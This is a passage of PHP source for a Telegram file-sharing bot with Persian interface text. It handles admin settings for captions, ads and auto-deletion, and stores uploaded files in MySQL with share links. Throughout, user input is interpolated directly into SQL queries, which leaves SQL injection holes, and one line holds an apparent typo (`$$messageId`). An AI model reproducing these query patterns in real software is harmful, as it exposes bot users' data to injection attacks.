        deleteMessage($from_id, $message_id);
        if ($ads['type_id']) $messageId = ForwardMessage($from_id, $ads['columnOne'], $ads['type_id'])->result->message_id;
        else $messageId = sendMessage($from_id, "`تبلیغی تنظیم نشده است.`", "markdown")->result->message_id;
            
        sendMessage($from_id, " تبلیغ فعلی 👆👆👆 \n\n  برای تنظیم روی دکمه ( ⚙️ تنظیم تبلیغ ) ، برای حذف روی دکمه ( 🗑 حذف تبلیغ ) و برای بازگشت روی ( 🔙 برگشت 🔙 ) بزنید.", "html", json_encode(['inline_keyboard' => [
            [['text' => "⚙️ تنظیم تبلیغ ⚙️", 'callback_data' => "set_ads"], ['text' => "🗑 حذف تبلیغ 🗑", 'callback_data' => "del_ads"]],
            [['text' => "🔙 برگشت 🔙", 'callback_data' => "manage_ads"]]
            ]]), $messageId); 

    }
    #===#
    elseif ($data == "del_caption") {
        $caption_sql = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'caption'"))['columnOne'];
        if ($caption_sql) {
            $db->query("UPDATE `settings` SET `columnOne` = '' WHERE `type` = 'caption'");
            answercallbackquery($callback_query_id, "❌ کپشن با موفقیت حذف شد.");

            $caption_sql = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'caption'"))['columnOne'] ?: "کپشن تنظیم نشده است...";
            $caption_set = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'caption'"))['columnTwo'];
            if ($caption_set == "AllFiles") {$All = "✅"; $noCaption = "";}
            elseif ($caption_set == "noAllFiles") {$All = ""; $noCaption = "✅";}

            editMessageText($from_id, $message_id, "متن کپشن : \n\n <code>$caption_sql</code> \n\n برای تنظیم روی دکمه ( ⚙️ تنظیم کپشن ) ، برای حذف روی دکمه ( 🗑 حذف کپشن ) و برای بازگشت روی ( 🔙 برگشت 🔙 ) بزنید.", "html", json_encode(['inline_keyboard' => [
                [['text' => "همه ی آپلود شده ها $All", 'callback_data' => "manage_ads"], ['text' => "آپلود شده های بدون کپشن $noCaption", 'callback_data' => "set_caption"]],
                [['text' => "⚙️ تنظیم کپشن ⚙️", 'callback_data' => "set_caption"], ['text' => "🗑 حذف کپشن 🗑", 'callback_data' => "del_caption"]],
                [['text' => "🔙 برگشت 🔙", 'callback_data' => "manage_ads"]]
            ]]));
        } else  answercallbackquery($callback_query_id, "❌ کپشن تنظیم نشده است");
    }

    #===#
    elseif ($data == "del_seenLink") {
        $seen_link = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'seen_link'"))['type_id'];
        if ($seen_link) {
            $db->query("UPDATE `settings` SET `type_id` = '' WHERE `type` = 'seen_link'");
            answercallbackquery($callback_query_id, "❌ سین اجباری با موفقیت حذف شد.");

            $seen_link = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'seen_link'"))['type_id'] ?: "لینک تنظیم نشده است...";
        
            editMessageText($from_id, $message_id, "لینک سین اجباری : \n\n $seen_link \n\n برای تنظیم روی دکمه ( ⚙️ تنظیم لینک ) ، برای حذف روی دکمه ( 🗑 حذف سین اجباری ) و برای بازگشت روی ( 🔙 برگشت 🔙 ) بزنید.", "html", json_encode(['inline_keyboard' => [
                [['text' => "⚙️ تنظیم لینک ⚙️", 'callback_data' => "set_seenLink"], ['text' => "🗑 حذف سین اجباری 🗑", 'callback_data' => "del_seenLink"]],
                [['text' => "🔙 برگشت 🔙", 'callback_data' => "manage_ads"]]
                ]]));
            } else  answercallbackquery($callback_query_id, "❌ لینک سین اجباری تنظیم نشده است");
    }

    #===#
    elseif ($data == "del_ads") {
        $ads = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'ads'"));
        if ($ads['type_id']) {
            $db->query("UPDATE `settings` SET `type_id` = '', `columnOne` = '' WHERE `type` = 'ads'");
            answercallbackquery($callback_query_id, "❌ ارسال تبلیغ با موفقیت حذف شد.");  
            deleteMessage($reply_from_id, $reply_message_id);

            editMessageText($from_id, $message_id, " ❌ تبلیغ تنظیم نشده است...  \n\n  برای تنظیم روی دکمه ( ⚙️ تنظیم تبلیغ ) ، برای حذف روی دکمه ( 🗑 حذف تبلیغ ) و برای بازگشت روی ( 🔙 برگشت 🔙 ) بزنید.", "html", json_encode(['inline_keyboard' => [
                [['text' => "⚙️ تنظیم تبلیغ ⚙️", 'callback_data' => "set_ads"], ['text' => "🗑 حذف تبلیغ 🗑", 'callback_data' => "del_ads"]],
                [['text' => "🔙 برگشت 🔙", 'callback_data' => "manage_ads"]]
                ]])); 
            
        } else answercallbackquery($callback_query_id, "❌ ارسال تبلیغ تنظیم نشده است");
    }

/**/

    #===#

    elseif ($data == "set_caption") {
        $caption_sql = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'caption'"))['columnOne'] ?: "کپشنی ثبت نشده است ...";

        deleteMessage($from_id, $message_id);
        sendMessage($from_id, "کپشن قبلی : \n\n <code>$caption_sql</code> \n\n▪️ لطفا کپشن خود را ارسال کنید :\n( تنها متن میتوانید ارسال کنید ; متن میتواند در قالب html نیز باشد )", "html", $back_panel, $messageId); 
        $db->query("UPDATE `user` SET `step` = 'set_caption' WHERE `from_id` = '$from_id'");
    }
    #===#
    elseif ($data == "set_seenLink") {
        $seen_link = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'seen_link'"))['type_id'] ?: "لینک تنظیم نشده است...";
        deleteMessage($from_id, $message_id);
        sendMessage($from_id, " لینک قبلی : \n\n $seen_link \n\n▪️ لطفا لینک خود را ارسال کنید :\n( تنها لینک دارای <code>https://t.me</code>  میتوانید ارسال کنید )", "html", $back_panel);
        $db->query("UPDATE `user` SET `step` = 'set_seenLink' WHERE `from_id` = '$from_id'");
    }
    #===#
    elseif ($data == "set_ads") {
        $ads = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'ads'"));

        deleteMessage($from_id, $message_id);
        $messageId = ForwardMessage($from_id, $ads['columnOne'], $ads['type_id'])->result->message_id;
        
        sendMessage($from_id, "👆 تبلیغ قبلی \n\n▪️ لطفا تبلیغ خود را ارسال یا فوروارد کنید :\nمیتوانید در قالب html ارسال کنید\n\nدر تایپ های : \nعکس . فیلم . گیف . ویس . آهنگ . متن ساده", "html", $back_panel, $messageId); 

        $db->query("UPDATE `user` SET `step` = 'set_ads' WHERE `from_id` = '$from_id'");
    }
    #===# 
    elseif ($step == "set_caption") {
        if ($text) {

            $db->query("UPDATE `settings` SET `columnOne` = '$text' WHERE `type` = 'caption'");
            $db->query("UPDATE `user` SET `step` = 'none' WHERE `from_id` = '$admin'");
            $caption_sql = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'caption'"))['columnOne'] ?: "کپشن تنظیم نشده است...";
            $caption_set = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'caption'"))['columnTwo'];
            if ($caption_set == "AllFiles") {$All = "✅"; $noCaption = "";}
            elseif ($caption_set == "noAllFiles") {$All = ""; $noCaption = "✅";}
            
            sendMessage($from_id, "✅ کپشن با موفقیت تنظیم شد", "html", $panel, $message_id); 
            sendMessage($from_id, "متن کپشن : \n\n <code>$caption_sql</code> \n\n برای تنظیم روی دکمه ( ⚙️ تنظیم کپشن ) ، برای حذف روی دکمه ( 🗑 حذف کپشن ) و برای بازگشت روی ( 🔙 برگشت 🔙 ) بزنید.", "html", json_encode(['inline_keyboard' => [
                [['text' => "همه ی آپلود شده ها $All", 'callback_data' => "manage_ads"], ['text' => "آپلود شده های بدون کپشن $noCaption", 'callback_data' => "set_caption"]],
                [['text' => "⚙️ تنظیم کپشن ⚙️", 'callback_data' => "set_caption"], ['text' => "🗑 حذف کپشن 🗑", 'callback_data' => "del_caption"]],
                [['text' => "🔙 برگشت 🔙", 'callback_data' => "manage_ads"]]
                ]]));

        } else sendMessage($from_id, "❌ تنها متن میتوانید ارسال کنید", "html", $back_panel, $message_id); 
    }
    #===#
    elseif ($step == "set_seenLink") {
        if (preg_match('/^https:\/\/t.me\/(.*)/', $text)) {
            
            
            $db->query("UPDATE `settings` SET `type_id` = '$text' WHERE `type` = 'seen_link'");
            $db->query("UPDATE `user` SET `step` = 'none' WHERE `from_id` = '$admin'");

            $seen_link = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'seen_link'"))['type_id'] ?: "لینک تنظیم نشده است...";
            sendMessage($from_id, "✅ لینک با موفقیت تنظیم شد", "html", $panel, $message_id); 
            sendMessage($from_id, "لینک سین اجباری : \n\n $seen_link \n\n برای تنظیم روی دکمه ( ⚙️ تنظیم لینک ) ، برای حذف روی دکمه ( 🗑 حذف سین اجباری ) و برای بازگشت روی ( 🔙 برگشت 🔙 ) بزنید.", "html", json_encode(['inline_keyboard' => [
                [['text' => "⚙️ تنظیم لینک ⚙️", 'callback_data' => "set_seenLink"], ['text' => "🗑 حذف سین اجباری 🗑", 'callback_data' => "del_seenLink"]],
                [['text' => "🔙 برگشت 🔙", 'callback_data' => "manage_ads"]]
                ]]));
        } else sendMessage($from_id, "⚠️ توجه داشته باشید که باید با <code>https://t.me/</code> و یا با @ شروع شود\nلطفا دوباره ارسال کنید", null, $back_panel, $message_id);
        
    }
    #===#
    elseif ($step == "set_ads") {
        
        $db->query("UPDATE `settings` SET `type_id` = '$message_id', `columnOne` = '$from_id'  WHERE `type` = 'ads'");
        
        $db->query("UPDATE `user` SET `step` = 'none' WHERE `from_id` = '$admin'");
        sendMessage($from_id, "✅ تبلیغ با موفقیت تنظیم شد", "markdown", $panel, $message_id);
        
        $messageId = ForwardMessage($from_id, $from_id, $message_id)->result->message_id; 
        sendMessage($from_id, " تبلیغ فعلی 👆👆👆 \n\n  برای تنظیم روی دکمه ( ⚙️ تنظیم تبلیغ ) ، برای حذف روی دکمه ( 🗑 حذف تبلیغ ) و برای بازگشت روی ( 🔙 برگشت 🔙 ) بزنید.", "html", json_encode(['inline_keyboard' => [
            [['text' => "⚙️ تنظیم تبلیغ ⚙️", 'callback_data' => "set_ads"], ['text' => "🗑 حذف تبلیغ 🗑", 'callback_data' => "del_ads"]],
            [['text' => "🔙 برگشت 🔙", 'callback_data' => "manage_ads"]]
            ]]), $$messageId); 
    }
    #===#
    elseif ($data == "set_allCaption") {
        $db->query("UPDATE `settings` SET `columnTwo` = 'AllFiles'  WHERE `type` = 'caption'");

        $caption_sql = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'caption'"))['columnOne'] ?: "کپشن تنظیم نشده است...";
        $caption_set = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'caption'"))['columnTwo'];
        if ($caption_set == "AllFiles") {$All = "✅"; $noCaption = "";}
        elseif ($caption_set == "noAllFiles") {$All = ""; $noCaption = "✅";}
        editMessageText($from_id, $message_id, "متن کپشن : \n\n <code>$caption_sql</code> \n\n برای تنظیم روی دکمه ( ⚙️ تنظیم کپشن ) ، برای حذف روی دکمه ( 🗑 حذف کپشن ) و برای بازگشت روی ( 🔙 برگشت 🔙 ) بزنید.", "html", json_encode(['inline_keyboard' => [
            [['text' => "همه ی آپلود شده ها $All", 'callback_data' => "set_allCaption"], ['text' => "آپلود شده های بدون کپشن $noCaption", 'callback_data' => "set_noAllCaption"]],
            [['text' => "⚙️ تنظیم کپشن ⚙️", 'callback_data' => "set_caption"], ['text' => "🗑 حذف کپشن 🗑", 'callback_data' => "del_caption"]],
            [['text' => "🔙 برگشت 🔙", 'callback_data' => "manage_ads"]]
            ]]));

    } 
    elseif ($data == "set_noAllCaption") {
        $db->query("UPDATE `settings` SET `columnTwo` = 'noAllFiles'  WHERE `type` = 'caption'");
        
        $caption_sql = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'caption'"))['columnOne'] ?: "کپشن تنظیم نشده است...";
        $caption_set = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'caption'"))['columnTwo'];
        if ($caption_set == "AllFiles") {$All = "✅"; $noCaption = "";}
        elseif ($caption_set == "noAllFiles") {$All = ""; $noCaption = "✅";}
        editMessageText($from_id, $message_id, "متن کپشن : \n\n <code>$caption_sql</code> \n\n برای تنظیم روی دکمه ( ⚙️ تنظیم کپشن ) ، برای حذف روی دکمه ( 🗑 حذف کپشن ) و برای بازگشت روی ( 🔙 برگشت 🔙 ) بزنید.", "html", json_encode(['inline_keyboard' => [
            [['text' => "همه ی آپلود شده ها $All", 'callback_data' => "set_allCaption"], ['text' => "آپلود شده های بدون کپشن $noCaption", 'callback_data' => "set_noAllCaption"]],
            [['text' => "⚙️ تنظیم کپشن ⚙️", 'callback_data' => "set_caption"], ['text' => "🗑 حذف کپشن 🗑", 'callback_data' => "del_caption"]],
            [['text' => "🔙 برگشت 🔙", 'callback_data' => "manage_ads"]]
            ]]));
    }
    #== set del time ==#
    elseif ($text == '⏳ تنظیم حذف خودکار ⏳') {
        $buttons = [[['text' =>  '🔙 برگشت 🔙'], ['text' => '0']]];
        for ($i = 1; $i < 100; $i++) {
            $pi = $i + 10;
            for ($i; $i < $pi; $i++) {
                $button[] = ['text' => "$i"];
            }
            $buttons[] = $button;
            $button = [];
            $i--;
        }
        $buttons = json_encode(['keyboard' => $buttons]);
        sendMessage($from_id, "*🖤 لطفا یک عدد را برای تنظیم زمان حذف شدن فایل انتخاب کنید :\n\n🔶 برای خاموش شدن حذف خودکار گزینه 0 را انتخاب کنید\n🔸 اعداد بر حسب دقیقه است 🔸\n\n🔷 برای حذف در زیر یک دقیقه از دستور زیر استفاده کنید :\n♦️ = 0.1 - 0.2 - 0.3\n🔹 هر 0.1 ، 6 ثانیه است🔹*", "markdown", $buttons, $message_id);
        $db->query("UPDATE `user` SET `step` = 'DeleteFile' WHERE `from_id` = '$admin'");
    }
    #===#
    elseif ($step == 'DeleteFile') {
        if (is_numeric($text)) {
            sendMessage($from_id, "✔️ مدت زمان با موفقیت تنظیم شد", null, $panel, $message_id);
            $db->query("UPDATE `user` SET `step` = 'none' WHERE `from_id` = '$admin'");
            $db->query("UPDATE `settings` SET `type_id` = '$text' WHERE `type` = 'del'");
        }
    }
}


#== get files ==# 
if ($text == '📤 آپلود آلبومی 📤') {
    if (isJoin($from_id)) {
        $id = random();
        sendMessage($from_id, "*〽️ لطفا فایل های خود را ارسال کنید 〽️*", "markdown", $btn_back, $message_id);
        if ($text == '📤 آپلود آلبومی 📤') $db->query("UPDATE `user` SET `step` = 'upload_$id' WHERE `from_id` = '{$from_id}' LIMIT 1");
    } else joinSend($from_id);
}

#==# #=#
if ($text != '✅️ اتمام آپلود آلبومی ✅️' and $step != "set_ads") {
    if (preg_match('/^upload_(.*)/', $step, $match)) {
        $id = $match[1];
    } else {
        $id = random();
    }

    if (isset($message->document) or isset($message->video) or isset($message->photo) or isset($message->sticker) or isset($message->audio) or isset($message->voice)) {
        if (isset($message->document)) {$file_type = "document"; $file_typeFa = "فایل"; $file_function = "senddocument";}
        elseif (isset($message->video)) {$file_type = "video"; $file_typeFa = "ویدیو"; $file_function = "sendvideo";}
        elseif (isset($message->photo)) {$file_type = "photo"; $file_typeFa = "عکس"; $file_function = "sendphoto";}
        elseif (isset($message->sticker)) {$file_type = "sticker"; $file_typeFa = "استیکر"; $file_function = "sendsticker";}
        elseif (isset($message->audio)) {$file_type = "audio"; $file_typeFa = "آهنگ"; $file_function = "sendaudio";}
        elseif (isset($message->voice)) {$file_type = "voice"; $file_typeFa = "ویس"; $file_function = "sendvoice";}

        if ($file_type != "photo") $file_id = $message->$file_type->file_id;
        elseif ($file_type == "photo")  $file_id = $message->photo[0]->file_id;

        if ($file_type != "photo") $file_size = $message->$file_type->file_size;
        elseif ($file_type == "photo") $file_size = $message->photo[0]->file_size;
        $size = convert($file_size);
        $time = date('h:i:s');
        $date = date('Y/m/d');
        $caption = $message->caption ?: '';
        
        $file_function($from_id, $file_id, "📍 $file_typeFa شما با موفقیت داخل دیتابیس ذخیره شده ... !\n▪️ شناسه $file_typeFa شما : <code>$id</code>\n\n➖ بقیه اطلاعات $file_typeFa شما : \n\n💾  حجم $file_typeFa : <b>$size</b>\n📝 توضیحات $file_typeFa : \n<code>$caption</code>\nلینک اشتراک گذاری $file_typeFa:\n📥 https://t.me/" . $usernamebot . "?start=get_" . $id
        , $message_id, "html", json_encode([
            'inline_keyboard' => [
                [['text' => "📋 تغییر کپشن", 'callback_data' => "editCaption_$id"]],
                [['text' => "🗑 حذف کپشن 🗑", 'callback_data' => "delCaption_$id"]]
                ]]));
        
        $db->query("INSERT INTO `file` (`id`, `file_id`, `type`,`caption`, `password`, `file_size`, `user_id`, `date`, `time`) VALUES ('{$id}', '{$file_id}', '{$file_type}', '$caption', '', '{$file_size}', '{$from_id}', '{$date}', '{$time}')");
    }
    if (preg_match('/^upload_(.*)/', $step)) {
        $count = mysqli_num_rows($db->query("SELECT * FROM `file` WHERE `id` = '{$id}'"));
        sendMessage($from_id, "🗂 تعداد فایل های آپلود شده تا اینجا : $count\n▪️ لطفا اگر فایل دیگری دارید بفرستید :", "markdown", $btn_end, $message_id);
        $db->query("UPDATE `user` SET `step` = 'upload_$id' WHERE `from_id` = '{$from_id}' LIMIT 1");
    }
}

elseif ($text == '✅️ اتمام آپلود آلبومی ✅️') {
    if (isJoin($from_id)) {
        if (preg_match('/^upload_(.*)/', $step, $match)) $id = $match[1];
        $count = mysqli_num_rows($db->query("SELECT * FROM `file` WHERE `id` = '{$id}'"));
        if ($count > 1) $fileCount = 'فایل های';
        else  $fileCount = 'فایل';
        sendMessage($from_id, "✅ $fileCount شما با موفقیت آپلود شد!\n\n📍 $fileCount شما با موفقیت داخل دیتابیس ذخیره شده ... !\n▪️ شناسه $fileCount شما : <code>$id</code>\n\n➖ شما : لینک اشتراک گذاری $fileCount:\n📥 https://t.me/" . $usernamebot . "?start=get_" . $id, "html", $btn_home, $message_id);
        $db->query("UPDATE `user` SET `step` = 'none' WHERE `from_id` = '{$from_id}' LIMIT 1");
    } else joinSend($from_id);
    exit(false);
}
}